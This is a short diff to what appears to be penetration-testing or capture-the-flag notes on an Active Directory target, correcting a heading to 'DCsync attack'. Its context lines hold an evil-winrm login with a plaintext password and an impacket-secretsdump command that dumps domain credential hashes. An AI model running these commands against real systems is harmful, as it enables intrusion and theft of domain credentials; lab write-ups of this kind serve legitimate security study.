@@ -150,7 +150,7 @@ evil-winrm -i $IP -u svc_loanmgr -p Moneymakestheworldgoround!
 ### BloodHound 
 Look in to `Reachable High Value Targets` or `Effective Inbound GPOs` under `Node Info`.
 
-### Try Dsync attack
+### Try DCsync attack
 ```bash
 impacket-secretsdump -just-dc svc_loanmgr:'Moneymakestheworldgoround!'@$IP
 ```
